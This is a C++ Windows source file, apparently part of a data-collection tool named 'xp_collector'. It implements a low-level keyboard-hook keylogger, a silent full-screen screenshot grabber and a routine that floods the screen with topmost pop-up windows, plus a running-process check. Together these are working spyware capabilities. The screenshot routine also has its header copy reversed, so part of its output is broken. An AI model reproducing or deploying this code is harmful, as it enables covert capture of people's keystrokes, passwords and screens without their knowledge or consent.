#include <cstdlib>
#include <ctime>
#include <thread>
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#include "AutoHandle.h"
#include "WinUtils.h"
#include "Utils/Strings.h"
#include "Utils/Uuid.h"
using namespace xp_collector;

bool windows::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
{
	if (!MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags)) {
		return false;
	}
	return true;
}

void windows::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
{
	// Get the screen dimensions
	const int screen_width = GetSystemMetrics(SM_CXSCREEN);
	const int screen_height = GetSystemMetrics(SM_CYSCREEN);

	for (size_t i = 0; i < count; ++i) {
		// Generate random positions for the message box
		int x_pos = uuid::rand_int(0, screen_width - 200); // 200 is an arbitrary width of the MessageBox
		int y_pos = uuid::rand_int(0, screen_height - 100); // 100 is an arbitrary height of the MessageBox

		// Create the message box in a new thread to avoid blocking the loop
		std::thread t([window_name, text, flags, x_pos, y_pos](const LPVOID param) -> DWORD
		              {
			              RECT rect;
			              GetWindowRect(static_cast<HWND>(param), &rect);
			              SetWindowPos(static_cast<HWND>(param), HWND_TOPMOST, x_pos, y_pos, 0, 0,
			                           SWP_NOSIZE | SWP_NOACTIVATE);
			              MessageBoxA(static_cast<HWND>(param), text.c_str(), window_name.c_str(),
			                          flags | MB_SETFOREGROUND);
			              return 0;
		              },
		              nullptr);
		t.detach();

		// Small delay between creating message boxes
		std::this_thread::sleep_for(std::chrono::milliseconds(SLEEP_BETWEEN_POPUPS_MILLIS));
	}
	std::this_thread::sleep_for(std::chrono::seconds(1));
}

std::string windows::take_screenshot()
{
	// Get the desktop device context (DC) of the entire virtual screen
	const HDC h_screen_dc = GetDC(nullptr);
	const HDC h_memory_dc = CreateCompatibleDC(h_screen_dc);

	// Get the dimensions of the virtual screen (covers all monitors)
	const int screen_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	const int screen_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	const int screen_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
	const int screen_top = GetSystemMetrics(SM_YVIRTUALSCREEN);

	// Create a compatible bitmap from the screen DC
	const HBITMAP h_bitmap = CreateCompatibleBitmap(h_screen_dc, screen_width, screen_height);

	// Select the compatible bitmap into the compatible memory DC
	const auto h_old_bitmap = static_cast<HBITMAP>(SelectObject(h_memory_dc, h_bitmap));

	// Bit block transfer into our compatible memory DC
	BitBlt(h_memory_dc, 0, 0, screen_width, screen_height, h_screen_dc, screen_left, screen_top, SRCCOPY);

	// Get the bitmap information
	BITMAP bmp;
	GetObject(h_bitmap, sizeof(BITMAP), &bmp);

	// Calculate the stride (row size) of the bitmap
	const int row_size = ((bmp.bmWidth * bmp.bmBitsPixel + 31) / 32) * 4;

	// Bitmap file header
	BITMAPFILEHEADER file_header;
	BITMAPINFOHEADER info_header;

	// Fill the file header
	file_header.bfType = 0x4D42; // "BM"
	file_header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	file_header.bfSize = file_header.bfOffBits + row_size * bmp.bmHeight;
	file_header.bfReserved1 = 0;
	file_header.bfReserved2 = 0;

	// Fill the info header
	info_header.biSize = sizeof(BITMAPINFOHEADER);
	info_header.biWidth = bmp.bmWidth;
	info_header.biHeight = bmp.bmHeight;
	info_header.biPlanes = 1;
	info_header.biBitCount = bmp.bmBitsPixel;
	info_header.biCompression = BI_RGB;
	info_header.biSizeImage = 0;
	info_header.biXPelsPerMeter = 0;
	info_header.biYPelsPerMeter = 0;
	info_header.biClrUsed = 0;
	info_header.biClrImportant = 0;

	// Allocate buffer for bitmap file
	std::string bmp_buffer(file_header.bfSize, '\0');

	// Copy headers
	std::copy_n(bmp_buffer.data(), sizeof(BITMAPFILEHEADER), reinterpret_cast<char*>(&file_header));
	std::copy_n(bmp_buffer.data() + sizeof(BITMAPFILEHEADER), sizeof(BITMAPINFOHEADER),
	            reinterpret_cast<char*>(&info_header));

	// Copy bitmap data
	GetDIBits(h_memory_dc, h_bitmap, 0, bmp.bmHeight, bmp_buffer.data() + file_header.bfOffBits,
	          reinterpret_cast<BITMAPINFO*>(&info_header), DIB_RGB_COLORS);

	// Cleanup
	SelectObject(h_memory_dc, h_old_bitmap);
	DeleteObject(h_bitmap);
	DeleteDC(h_memory_dc);
	ReleaseDC(nullptr, h_screen_dc);

	// Convert the buffer to a string
	return bmp_buffer;
}

BOOL windows::get_message_with_timeout(MSG* msg, const unsigned int timeout)
{
	const UINT_PTR timer_id = SetTimer(nullptr, 0, timeout, nullptr);
	const BOOL res = GetMessage(msg, nullptr, 0, 0);
	KillTimer(nullptr, timer_id);
	if (!res)
		return FALSE;
	if (msg->message == WM_TIMER && msg->hwnd == nullptr && msg->wParam == timer_id)
		return FALSE;
	return TRUE;
}

std::string windows::log_keys(const unsigned int duration_seconds)
{
	g_key_logger_key_codes.clear();
	const HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, log_keys_hook, nullptr, 0);

	MSG msg;
	get_message_with_timeout(&msg, duration_seconds * 1000);

	UnhookWindowsHookEx(hook_handle);

	std::string result;
	for (const DWORD val : g_key_logger_key_codes) {
		result.append(std::string(1, static_cast<char>(val)));
	}
	return result;
}

LRESULT CALLBACK windows::log_keys_hook(const int n_code, const WPARAM w_param, const LPARAM l_param)
{
	if (n_code == HC_ACTION) {
		switch (w_param) {
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			g_key_logger_key_codes.push_back(reinterpret_cast<PKBDLLHOOKSTRUCT>(l_param)->vkCode);
			break;
		default: break;
		}
	}
	return false; // don't consume event
}

bool windows::is_process_running(const std::string& name)
{
	const AutoHandle h_process_snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
	if (h_process_snap.get() == INVALID_HANDLE_VALUE) {
		return false;
	}
	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(h_process_snap.get(), &pe32)) {
		return false;
	}
	do {
		if (std::wstring(pe32.szExeFile) == strings::to_wstring(name)) {
			return true;
		}
	}
	while (Process32Next(h_process_snap.get(), &pe32));
	return false;
}
